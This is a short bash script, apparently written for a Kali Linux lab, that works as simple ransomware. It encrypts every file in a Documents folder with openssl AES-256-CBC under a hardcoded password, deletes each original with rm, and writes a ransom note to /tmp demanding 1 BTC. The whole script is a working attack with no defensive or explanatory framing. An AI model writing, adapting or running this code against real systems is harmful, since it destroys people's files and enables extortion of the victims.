#!/bin/bash
# Encrypt files in /home/kali/Documents/text/ directory and create a ransom note

TARGET_DIR="/home/kali/Documents/text"
RANSOM_NOTE="/tmp/ransom_note.txt"
PASSWORD="testpassword"  # The password for encryption

# Encrypt each file in the target directory
for file in "$TARGET_DIR"/*; do
  # Encrypt the file using openssl AES-256-CBC
  openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.enc" -k "$PASSWORD"
  
  # Remove the original file after encryption
  rm "$file"
done

# Create a ransom note
echo "Files encrypted. Send 1 BTC to unlock." > "$RANSOM_NOTE"
